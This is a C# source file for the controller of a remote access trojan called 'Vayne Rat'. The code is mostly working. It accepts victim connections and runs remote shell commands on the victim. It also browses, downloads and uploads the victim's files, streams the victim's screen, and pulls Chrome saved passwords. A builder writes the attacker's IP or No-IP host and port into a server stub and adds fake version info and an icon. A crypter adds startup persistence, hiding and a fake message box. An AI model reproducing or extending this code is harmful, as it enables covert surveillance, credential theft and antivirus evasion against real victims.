using fLaSh.Dissembler;
using Mono.Cecil;
using Mono.Cecil.Cil;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Vayne_Rat
{
    public partial class FrmMain : Form
    {
        FrmRdp fullScreenRdp;
        int port { get; set; }
        int bufferSize { get; set; }
        int writeSize = 0;
        int fdlSize = 0;
        string dirPath { get; set; }
        string fdl_location { get; set; }
        string fup_location { get; set; }
        string noIP { get; set; }
        string iconPath { get; set; }
        string sTIconPath { get; set; }
        bool isFileDownload { get; set; }
        bool isImage { get; set; }
        bool fullScreen { get; set; }
        Socket serverSocket { get; set; }
        Socket targetClient { get; set; }
        List<Socket> listSockets = new List<Socket>();
        byte[] buffer { get; set; }
        byte[] receiveFile = new byte[1];
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;
        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();
        public FrmMain()
        {
            InitializeComponent();
            colorListViewHeader(ref listClients, listClients.BackColor, listClients.ForeColor);
            colorListViewHeader(ref listFileManager, listClients.BackColor, listClients.ForeColor);
            colorListViewHeader(ref listPasswords, listClients.BackColor, listClients.ForeColor);
            //MenuClients.ForeColor = Color.FromArgb(232, 122, 10);
            //MenuFileManager.ForeColor = Color.FromArgb(232, 122, 10);
            groupBox1.ForeColor = Color.FromArgb(43, 183, 96);
            groupBox2.ForeColor = Color.FromArgb(43, 183, 96);
            groupBox3.ForeColor = Color.FromArgb(43, 183, 96);
            groupBox4.ForeColor = Color.FromArgb(43, 183, 96);
        }
        public static void colorListViewHeader(ref ListView list, Color backColor, Color foreColor)
        {
            list.OwnerDraw = true;
            list.DrawColumnHeader +=
                new DrawListViewColumnHeaderEventHandler
                (
                    (sender, e) => headerDraw(sender, e, backColor, foreColor)
                );
            list.DrawItem += new DrawListViewItemEventHandler(bodyDraw);
        }
        private static void headerDraw(object sender, DrawListViewColumnHeaderEventArgs e, Color backColor, Color foreColor)
        {
            e.Graphics.FillRectangle(new SolidBrush(backColor), e.Bounds);
            e.Graphics.DrawString(e.Header.Text, e.Font, new SolidBrush(foreColor), e.Bounds);
        }
        private static void bodyDraw(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void PanelBar_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
        }

        private void lblVersion_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
        }

        private void btnClients_Click(object sender, EventArgs e)
        {
            setPanel(PanelClients);
            
        }

        private void btnCmd_Click(object sender, EventArgs e)
        {
            setPanel(PanelCmd);
        }

        private void btnFileManager_Click(object sender, EventArgs e)
        {
            setPanel(PanelFileManager);
        }

        private void btnRdp_Click(object sender, EventArgs e)
        {
            setPanel(PanelRdp);
        }

        private void btnPasswords_Click(object sender, EventArgs e)
        {
            setPanel(PanelPwRecovery);
        }

        private void btnBuilder_Click(object sender, EventArgs e)
        {
            setPanel(PanelBuilder);
        }

        private void setPanel(object sender)
        {
            pictureBox1.Visible = true;
            PanelClients.Visible = false;
            PanelCmd.Visible = false;
            PanelFileManager.Visible = false;
            PanelRdp.Visible = false;
            PanelPwRecovery.Visible = false;
            PanelBuilder.Visible = false;
            PanelCrypter.Visible = false;
            ((Panel)sender).Visible = true;
        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            try
            {
                port = (int)Nport.Value;
            }
            catch (ArgumentOutOfRangeException)
            {
                MessageBox.Show("Bad Value");
                return;
            }

            try
            {
                bufferSize = 104857600;
                buffer = new byte[bufferSize];

                serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Any, port);
                serverSocket.Bind(ipEndPoint);
                serverSocket.Listen(50);
                serverSocket.BeginAccept(AcceptcallBack, serverSocket);
                updateStatus();
            }
            catch (SocketException msg)
            {
                MessageBox.Show(msg.Message);
                return;
            }
        }
        private void AcceptcallBack(IAsyncResult ar)
        {
            Socket connection;
            try
            {
                connection = serverSocket.EndAccept(ar);
            }
            catch (SocketException msg)
            {
                MessageBox.Show(msg.Message);
                return;
            }

            listSockets.Add(connection);
            int id = listSockets.Count;
            addClientID(id);
            updateStatus();
            string cmd = string.Format("getInfo~{0}", id);
            sendCmd(cmd,id);
            //create info & command
            connection.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceivecallBack, connection);
            serverSocket.BeginAccept(AcceptcallBack, null);
        }

        private void ReceivecallBack(IAsyncResult ar)
        {
            Socket currentSocket = (Socket)ar.AsyncState;
            int recevied;

            try
            {
                recevied = currentSocket.EndReceive(ar);
            }
            catch (SocketException msg)
            {
                MessageBox.Show(msg.Message);
                return;
            }

            byte[] receivedBuffer = new byte[recevied];
            Array.Copy(buffer, receivedBuffer, recevied);
            //check info
            //string cmd = Encoding.Unicode.GetString(receivedBuffer);
            //cmd = Decrypt(cmd);
            if (isImage)
                processImage(receivedBuffer);
            if (isFileDownload)
                processDUInfo(receivedBuffer);
            else if(!isFileDownload)
                processNormalInfo(receivedBuffer);
            currentSocket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceivecallBack, currentSocket);
        }

        private void processImage(byte[] data)
        {
            string header = Encoding.Unicode.GetString(data, 0, 16);
            if(header.Equals("rdpImage"))
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    try
                    {
                        ms.Write(data, 16, data.Length - 16);
                        Bitmap image = (Bitmap)Bitmap.FromStream(ms);
                        addImage(image);
                        Array.Clear(data, 0, data.Length);
                    }

                    catch (Exception) { };
                }
            }
        }
        private void processNormalInfo(byte[] receivedBuffer,string cmd="")
        {
            cmd = Encoding.Unicode.GetString(receivedBuffer);
            cmd = Decrypt(cmd);

            if(cmd.Equals("salam"))
            {
                MessageBox.Show("salam mikone");
            }
            if (cmd.StartsWith("infoBack"))
            {
                string[] info = cmd.Split('|');
                addClientInfo(info[1]);

            }

            else if (cmd.StartsWith("cmdout§"))
            {

                string results = cmd.Split('§')[1];
                updateUI(() => Logs.Text += results);

            }

            else if (cmd.StartsWith("drivesList~"))
            {
                updateUI(() => listFileManager.Items.Clear());

                string drives = cmd.Split('~')[1];
                string[] drivesList = drives.Split('\n');
                foreach (string driverInfo in drivesList)
                {
                    if (!driverInfo.Contains("|"))
                        continue;

                    string name = driverInfo.Split('|')[0];
                    string size = driverInfo.Split('|')[1];

                    addFileManagerInfo(name, size, "N/A", name);
                }

            }

            else if (cmd.StartsWith("enterPath~"))
            {
                updateUI(() => listFileManager.Items.Clear());
                string info = cmd.Split('~')[1];
                string[] directories = info.Split('\n');

                foreach (string s in directories)
                {
                    if (s == "")
                        continue;
                    string name = s.Split('|')[0];
                    string size = s.Split('|')[1];
                    string creationTime = s.Split('|')[2];
                    string path = s.Split('|')[3];

                    addFileManagerInfo(name, size, creationTime, path);
                }
            }

            else if (cmd.StartsWith("backPath~"))
            {
                string info = cmd.Split('~')[1];

                if (info.Equals("driveList"))
                {
                    updateUI(() => drivesListToolStripMenuItem.PerformClick());
                }

                else
                {
                    dirPath = info;
                    sendCmdToTarget("enterPath~" + info);
                }


            }

            else if (cmd.StartsWith("fInfo~"))
            {
                int size = int.Parse(cmd.Split('~')[1]);
                fdlSize = size;
                receiveFile = new byte[fdlSize];
                isFileDownload = true;
                sendCmdToTarget("fdlConfirm");
            }

            else if (cmd.Equals("fupConfirm"))
            {
                updateUI(() => LogsFileManager.Text += "Upload Request Accepted.\n" +
                "Uploading " + Path.GetFileName(fup_location) + " To " + dirPath+"\n");
                byte[] dataToSend = File.ReadAllBytes(fup_location);
                sendFileToTarget(dataToSend);
            }

            else if (cmd.Equals("fileReceived"))
                updateUI(() => LogsFileManager.Text += "Uploaded.\n");

            else if(cmd.StartsWith("pwRequest~"))
            {
                string info = cmd.Split('~')[1];
                addPwInfo(info);
                sendCmdToTarget("cleanPw");

            }

            else if (cmd.StartsWith("error~"))
            {
                processErrors(cmd.Split('~')[1]);
            }
        }

        private void processDUInfo(byte[] buffer)
        {
            updateUI(() => LogsFileManager.Text += "Download Request Accepted.\n");
            updateUI(() => LogsFileManager.Text += "Downloading \"" + Path.GetFileName(fdl_location) + "\"" + "\n");
            writeSize = 0;
            Buffer.BlockCopy(buffer, 0, receiveFile, writeSize, buffer.Length);
            writeSize += buffer.Length;

            if(writeSize == fdlSize)
            {
                using (FileStream fs = File.Create(fdl_location))
                {
                    Byte[] info = receiveFile;
                    fs.Write(info, 0, info.Length);
                }
            }

            //File.WriteAllBytes(fdl_location, buffer);
            Array.Clear(receiveFile, 0, receiveFile.Length);
            updateUI(() => LogsFileManager.Text += Path.GetFileName(fdl_location) + " Downloaded.\n");
            isFileDownload = false;
        }

        private void processErrors(string errorText)
        {
            if(errorText.Contains("cmdFaild"))
            {
                MessageBox.Show("Start Cmd Before Use!","Vayne Rat",MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (errorText.Contains("Directory") || errorText.Contains("File") || 
                errorText.Contains("EnterPath") || errorText.Contains("Access"))
                updateUI(() => LogsFileManager.Text += errorText);
        }

        private void sendCmd(string cmd,int id)
        {
            Socket socket = listSockets[id - 1];
            byte[] data = Encoding.Unicode.GetBytes(cmd);
            socket.Send(data);
        }

        private void sendCmdToTarget(string cmd)
        {
            if(targetClient!=null)
            {
                cmd = Encrypt(cmd);
                byte[] dataToSend = Encoding.Unicode.GetBytes(cmd);
                targetClient.Send(dataToSend);
            }
            
            else
            {
                MessageBox.Show("Select Your Target!", "Vayne Rat", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }

        private void sendFileToTarget(byte[] data)
        {
            try
            {
                targetClient.Send(data);
            }
            catch(Exception ex)
            {
                updateUI(() => LogsFileManager.Text += ex.Message+"\n");
            }
        }

        private void addImage(Bitmap image)
        {
            if(!fullScreen)
                updateUI(() => pBRdp.Image = image);
            else
            {
                fullScreenRdp.image = image;
                //fullScreenRdp.Show();
            }
        }
        private void addClientID(int id)
        {
            updateUI(() => listClients.Items.Add(id.ToString()));
        }

        private void addClientInfo(string info)
        {
            string[] data = info.Split('~');
            int id = Int32.Parse(data[0]);
            ListViewItem client = new ListViewItem();
            updateUI(() => client = listClients.Items[id - 1]);
            updateUI(() => client.SubItems.Add(data[1]));
            updateUI(() => client.SubItems.Add(data[2]));
            updateUI(() => client.SubItems.Add(data[3]));
            updateUI(() => client.SubItems.Add(data[4]));
            updateUI(() => client.SubItems.Add(data[5]));

        }

        private void addFileManagerInfo(string name,string size,string creationTime,string path)
        {
            if(!size.Equals("N/A"))
                size = FormatBytes(long.Parse(size));
            ListViewItem lvi = new ListViewItem();
            lvi.Text = name;
            lvi.SubItems.Add(size);
            lvi.SubItems.Add(creationTime);
            lvi.SubItems.Add(path);

            updateUI(()=> listFileManager.Items.Add(lvi));
            updateUI(() => listFileManager.Items[0].Selected = true);
        }

        private void addPwInfo(string info)
        {
            updateUI(() => listPasswords.Items.Clear());
            string[] sites = info.Split('\n');
            foreach( string site in sites)
            {
                try
                {
                    string host = site.Split('|')[0];
                    string username = site.Split('|')[1];
                    string password = site.Split('|')[2];

                    ListViewItem lvi = new ListViewItem();
                    lvi.Text = host;
                    lvi.SubItems.Add(username);
                    lvi.SubItems.Add(password);
                    lvi.SubItems.Add("Chrome");

                    updateUI(() => listPasswords.Items.Add(lvi));
                    updateUI(() => listPasswords.Items[0].Selected = true);
                }
                catch { continue; };
            }
        }

        //stackoverflow.com/questions/1242266/converting-bytes-to-gb-in-c
        private static string FormatBytes(long bytes)
        {

            string[] Suffix = { "B", "KB", "MB", "GB", "TB" };
            int i;
            double dblSByte = bytes;
            for (i = 0; i < Suffix.Length && bytes >= 1024; i++, bytes /= 1024)
            {
                dblSByte = bytes / 1024.0;
            }

            return String.Format("{0:0.##} {1}", dblSByte, Suffix[i]);
        }

        private void updateStatus(string text ="n")
        {
            if(text.Equals("n"))
                updateUI(() => lblStatus.Text =
                string.Format("Status: Listening on port {0} | Connections: {1}", port, listClients.Items.Count));
            else
                updateUI(() => lblStatus.Text =
                string.Format(text));

        }

        private void updateBStatus(string text)
        {

            updateUI(()=> lblBStatus.Text += string.Format("{0}\n", text));
            System.Threading.Thread.Sleep(200);
        }

        private void updateCStatus(string text)
        {
            updateUI(() => lblStatusSTCrypter.Text += string.Format("{0}\n", text));
            System.Threading.Thread.Sleep(200);
        }
        private void updateUI(Action action)
        {
            this.Invoke(new Action(action), null);
        }

        private void listClients_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                if (listClients.FocusedItem.Bounds.Contains(e.Location))
                    MenuClients.Show(Cursor.Position);
            }
        }

        private void selectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listClients.Items.Count > 0)
            {
                int id;
                ListViewItem item = listClients.FocusedItem;
                id = Int32.Parse(item.SubItems[0].Text);
                targetClient = listSockets[id - 1];
                string username = item.SubItems[2].Text;
                string connection = item.SubItems[1].Text;
                string statusText = string.Format("Status: Listening on port {0} | Connections: {1} | Target: {2}", port, listClients.Items.Count,username);
                updateStatus(statusText);

                updateUI(() => lblStatusCmdShell.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
                updateUI(() => lblStatusFileManager.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
                updateUI(() => lblStatusRdp.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
                updateUI(() => lblStatusPwRecovery.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));

            }
        }

        private void txtCommand_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return)
            {
                string info = "cmd§" + txtCommand.Text;
                //targetClient.Send(Encoding.Unicode.GetBytes(info));
                sendCmdToTarget(info);
                txtCommand.Text = "";
            }

            else if (e.KeyCode == Keys.Return && txtCommand.Text.ToLower().Equals("cls"))
            {
                Logs.Text = "";
            }
        }

        private void runCmdShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //byte[] data = Encoding.Unicode.GetBytes("startCmd");
            //targetClient.Send(data);
            sendCmdToTarget("startCmd");
        }

        public string Encrypt(string clearText)
        {
            string EncryptionKey = "MAKV2SPBNI99212";
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (Rijndael encryptor = Rijndael.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }
            return clearText;
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212";
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Rijndael encryptor = Rijndael.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
            catch (Exception)
            {
                //plain text?
                return cipherText;
            }
        }

        public static void ReplaceString(string old, string replacement, AssemblyDefinition asm)
        {
            foreach (ModuleDefinition mod in asm.Modules)
            {
                foreach (TypeDefinition td in mod.Types)
                {
                    IterateType(td, old, replacement);
                }
            }
        }
        public static void IterateType(TypeDefinition td, string old, string replacement)
        {
            foreach (TypeDefinition ntd in td.NestedTypes)
            {
                IterateType(ntd, old, replacement);
            }

            foreach (MethodDefinition md in td.Methods)
            {
                if (md.HasBody)
                {
                    for (int i = 0; i < md.Body.Instructions.Count - 1; i++)
                    {
                        Instruction inst = md.Body.Instructions[i];
                        if (inst.OpCode == OpCodes.Ldstr)
                        {
                            if (inst.Operand.ToString().Equals(old))
                            {
                                inst.Operand = replacement;
                            }
                        }
                    }
                }
            }
        }

        private void drivesListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            dirPath = "dirvesList";
            sendCmdToTarget("drivesList");
        }

        private void enterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(listFileManager.SelectedIndices.Count>0)
            {
                string pathToEnter = listFileManager.SelectedItems[0].SubItems[3].Text;
                dirPath = pathToEnter;
                sendCmdToTarget("enterPath~" + pathToEnter);
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dirPath.Equals("dirvesList"))
                return;
            sendCmdToTarget("backPath~" + dirPath);
        }

        private void Logs_TextChanged(object sender, EventArgs e)
        {
            updateUI(() => Logs.SelectionStart = Logs.Text.Length);
            updateUI(() => Logs.ScrollToCaret());
        }

        private void LogsFileManager_TextChanged(object sender, EventArgs e)
        {
            updateUI(() => LogsFileManager.SelectionStart = LogsFileManager.Text.Length);
            updateUI(() => LogsFileManager.ScrollToCaret());
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(listFileManager.SelectedItems.Count>0)
            {
                if (listFileManager.SelectedItems[0].SubItems[1].Text.Equals("Directory"))
                {
                    updateUI(() => LogsFileManager.Text += "Cannot Download a Directory!+\n");
                    return;
                }

                if (!File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\ratDownloads"))
                    Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "\\ratDownloads");

                string filename = listFileManager.SelectedItems[0].SubItems[3].Text;
                updateUI(() => LogsFileManager.Text += "Sending Download Request ...\n");
                fdl_location = "ratDownloads\\" + Path.GetFileName(filename);
                sendCmdToTarget("fdl~" + filename);
            }
            

        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string info = dirPath;
            string fileName = "";

            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
                fup_location = ofd.FileName;

            fileName = Path.GetFileName(fup_location);
            info += "\\" + fileName + "~" + new FileInfo(fup_location).Length;

            LogsFileManager.Text += "Sending Upload Request ...";
            sendCmdToTarget("fup~" + info);
        }

        private void btnStartRdp_Click(object sender, EventArgs e)
        {
            fullScreenRdp = new FrmRdp();
            fullScreen = false;
            isImage = true;
            sendCmdToTarget("rdpStart");
        }

        private void btnRdpStop_Click(object sender, EventArgs e)
        {
            isImage = false;
            if(pBRdp.Image!=null)
                updateUI(() => pBRdp.Image.Dispose());
            updateUI(() => pBRdp.Image = null);
            updateUI(() => comboRdp.SelectedIndex = 0);
            if(fullScreenRdp!=null)
                fullScreenRdp.Close();
            sendCmdToTarget("rdpStop");

        }

        private void comboRdp_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch(comboRdp.SelectedIndex)
            {
                /*Zoom Screen
                CenterImage
                AutoSize*
                Full Screen*/
                case 0:
                    fullScreen = false;
                    updateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.Zoom);
                    break;
                case 1:
                    fullScreen = false;
                    updateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.CenterImage);
                    break;
                case 2:
                    fullScreen = false;
                    updateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.AutoSize);
                    break;
                case 3:
                    fullScreen = true;
                    fullScreenRdp.Show();
                    break;
                default:
                    fullScreen = false;
                    updateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.Zoom);
                    break;
            }
        }

        private void btnReqPw_Click(object sender, EventArgs e)
        {
            sendCmdToTarget("pwRequest");
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            lblBStatus.Text = "";
            new System.Threading.Thread(() =>
            {
                updateBStatus("Building ...");
                byte[] createServer = Properties.Resources.server;
                string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, txtOFN.Text);

                try
                {
                    File.WriteAllBytes(path, createServer);
                    updateBStatus("File Created: " + txtOFN.Text);
                    AssemblyDefinition asmDefinition = AssemblyDefinition.ReadAssembly(path);

                    if (cbNoIP.Checked)
                    {
                        noIP = "yes";
                        ReplaceString("noip", noIP, asmDefinition);
                        updateBStatus("Setting Up No-IP Host Address: " + txtIPAddress.Text);
                    }
                    else
                    {
                        noIP = "no";
                        ReplaceString("noip", noIP, asmDefinition);
                        updateBStatus("Setting Up IP-Address: " + txtIPAddress.Text);
                    }
                    ReplaceString("ip", txtIPAddress.Text, asmDefinition);

                    ReplaceString("port", nudPort.Value.ToString(), asmDefinition);
                    updateBStatus("Setting Up Port-Number: " + nudPort.Value);

                    ReplaceString("delay", nudDelay.Value.ToString(), asmDefinition);
                    updateBStatus("Setting Up Reconnect-Delay: " + nudDelay.Value + " ms");

                    asmDefinition.Write(path);
                    updateBStatus("Settings Completed.");

                    char n = '\0';
                    VersionResource oVersionResource = new VersionResource();
                    oVersionResource.LoadFrom(path);
                    oVersionResource.FileVersion = txtFV1.Text + "." + txtFV2.Text + "." + txtFV3.Text + "." + txtFV4.Text;//txtFilev.Text; 14,13,12,5
                    oVersionResource.ProductVersion = txtPV1.Text + "." + txtPV2.Text + "." + txtPV3.Text + "." + txtPV4.Text;// txtProductv.Text; 6,,9,10,11

                    StringFileInfo oStringFileInfo = (StringFileInfo)oVersionResource["StringFileInfo"];

                    updateBStatus("Adding Assembly Information: " + txtOFN.Text);
                    oStringFileInfo["OriginalFilename"] = txtOFN.Text + n;
                    oStringFileInfo["FileVersion"] = oVersionResource.FileVersion + n;
                    oStringFileInfo["ProductName"] = txtPN.Text + n;
                    oStringFileInfo["ProductVersion"] = oVersionResource.ProductVersion + n;
                    oStringFileInfo["Assembly Version"] = oVersionResource.ProductVersion + n;
                    oStringFileInfo["LegalCopyright"] = txtLC.Text + n;
                    oStringFileInfo["FileDescription"] = txtFD.Text + n;

                    oVersionResource.SaveTo(path);
                    updateBStatus("Assembly Information Added.");

                    if (!string.IsNullOrEmpty(iconPath))
                    {
                        updateBStatus("Icon Added: " + iconPath);
                        IconFile icon = new IconFile(iconPath);
                        GroupIconResource gr = icon.ConvertToGroupIconResource();
                        gr.SaveTo(txtOFN.Text);
                    }

                    updateBStatus(txtOFN.Text + " Created Successfully.");
                    updateBStatus("Building Completed.");
                    //File.Delete(txtOFN.Text);

                }
                catch (Exception error)
                {
                    MessageBox.Show(error.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }).Start();

            
        }

        private void btnIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Image files (*.ico *.jpg, *.jpeg, *.jpe, *.jfif, *.png) | *.ico; *.jpg; *.jpeg; *.jpe; *.jfif; *.png";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                pbIcon.Image = Image.FromFile(ofd.FileName);
                iconPath = ofd.FileName;
            }
        }

        private void btnCrypter_Click(object sender, EventArgs e)
        {
            setPanel(PanelCrypter);
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                lblStatusSTCrypter.Text = "";
                txtFilePath.Text = ofd.FileName;
                lblStatusSTCrypter.Text = "";
                updateCStatus("File Selected: " + Path.GetFileName(txtFilePath.Text));
            }
        }

        private void btnEncrypt_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog()
            {
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.CurrentDirectory
            };

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                lblStatusSTCrypter.Text = "";
                updateCStatus("File Selected: " + Path.GetFileName(txtFilePath.Text));
                new System.Threading.Thread(() =>
                {

                    try
                    {
                        string source = Properties.Resources.stub;
                        updateCStatus("Reading Bytes ...");
                        byte[] readFBytes = File.ReadAllBytes(txtFilePath.Text);
                        updateCStatus("Checking Options ...");

                        if (chStartup.Checked)
                        {
                            source = source.Replace("[startup - replace]", "true");
                            updateCStatus("Add to Startup: Yes");
                        }
                        else
                        {
                            source = source.Replace("[startup - replace]", "false");
                            updateCStatus("Add to Startup: No");
                        }

                        if (chHide.Checked)
                        {
                            source = source.Replace("[hide - replace]", "true");
                            updateCStatus("Hide: Yes");
                            updateCStatus("Adding Hide Option");
                            updateCStatus("Hide Option Added");
                        }

                        else
                        {
                            source = source.Replace("[hide - replace]", "false");
                            updateCStatus("Hide: No");
                        }

                        if (chRName.Checked)
                        {
                            source = source.Replace("[random-replace]", "true");
                            updateCStatus("Random Name: Yes( If Duplicated )");
                        }

                        else
                        {
                            source = source.Replace("[random-replace]", "false");
                            updateCStatus("Random Name: No");
                        }

                        if (rbNative.Checked)
                        {
                            updateCStatus("Resources Mode: Native");
                            source = source.Replace("[storage-replace]", "native");
                        }

                        else
                        {
                            updateCStatus("Resources Mode: Managed");
                            source = source.Replace("[storage-replace]", "managed");
                        }
                        string s = "";
                        updateUI(() => s = comboEPath.SelectedItem.ToString());
                        updateCStatus("Execution Path: " + s);
                        source = source.Replace("[execute-path]", s);
                        source = source.Replace("[file-name]", Path.GetFileName(txtFilePath.Text));
                        updateCStatus("Encryption Key: " + txtEKey.Text);
                        source = source.Replace("[key-replace]", txtEKey.Text);

                        if (chMsgbox.Checked)
                        {
                            updateCStatus("Fake Messagebox: Yes");
                            updateCStatus("Adding Fake Messagebox");
                            source = source.Replace("[msgbox - replace]", "true");
                            source = source.Replace("[msgbox - title]", txtMTitle.Text);
                            source = source.Replace("[msgbox - text]", txtMCaption.Text);

                            if (rbError.Checked)
                                source = source.Replace("[msg - icon]", "MessageBoxIcon.Error");
                            else if (rbExclamation.Checked)
                                source = source.Replace("[msg - icon]", "MessageBoxIcon.Exclamation");
                            else
                                source = source.Replace("[msg - icon]", "MessageBoxIcon.Information");

                            updateCStatus("Fake Messagebox Added.");
                            updateCStatus("Creating Stub ...");


                        }

                        else
                            source = source.Replace("[msgbox - replace]", "false");

                        byte[] EncryptedBytes = Encryption.AESEncrypt(readFBytes, txtEKey.Text);
                        bool success;

                        if (rbNative.Checked)
                        {
                            MessageBox.Show("Disabled In This Version.\nUse Managed Resources");
                            return;
                        }

                        else
                        {
                            string ResFile = Path.Combine(Application.StartupPath, "Encrypted.resources");
                            using (ResourceWriter Writer = new ResourceWriter(ResFile))
                            {
                            // Add the encrypted bytes to the resource file.
                            Writer.AddResource("encfile", EncryptedBytes);
                            // Generate the resource file.
                            Writer.Generate();

                            }
                            
                            if(sTIconPath.Equals(null))
                                success = Compiler.CompileFromSource(source, sfd.FileName, null, new string[] { ResFile });
                            else
                                success = Compiler.CompileFromSource(source, sfd.FileName, sTIconPath, new string[] { ResFile });

                            // Now that the stub was compiled, we delete
                            // the resource file since we don't need it anymore.
                            File.Delete(ResFile);
                        }

                        if (success)
                        {
                            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)+"\\1.cs", source);
                            updateCStatus("Stub Created.");
                            MessageBox.Show("Your file has been successfully protected.",
                                "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                    catch (Exception ex) { updateCStatus("Error: " + ex.Message); }


                }).Start();
            }
        }

        private void chMsgbox_CheckedChanged(object sender, EventArgs e)
        {
            if(chMsgbox.Checked)
            {
                txtMCaption.Enabled = true;
                txtMTitle.Enabled = true;
                btnMTest.Enabled = true;
                rbError.Enabled = true;
                rbExclamation.Enabled = true;
                rbInformation.Enabled = true;
            }

            else
            {
                txtMCaption.Enabled = false;
                txtMTitle.Enabled = false;
                btnMTest.Enabled = false;
                rbError.Enabled = false;
                rbExclamation.Enabled = false;
                rbInformation.Enabled = false;
            }
        }

        private void btnMTest_Click(object sender, EventArgs e)
        {
            MessageBoxIcon mbIcon;
            if (rbError.Checked)
                mbIcon = MessageBoxIcon.Error;
            else if (rbExclamation.Checked)
                mbIcon = MessageBoxIcon.Exclamation;
            else
                mbIcon = MessageBoxIcon.Information;
            MessageBox.Show(txtMCaption.Text, txtMTitle.Text, MessageBoxButtons.OK, mbIcon);
        }

        private void btnSTIcon_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if(ofd.ShowDialog()==DialogResult.OK)
            {
                pSTIcon.Image = Image.FromFile(ofd.FileName);
                sTIconPath = ofd.FileName;
            }
            
        }

        private void bunifuCustomLabel2_Click(object sender, EventArgs e) {
            Close();
        }
    }
}
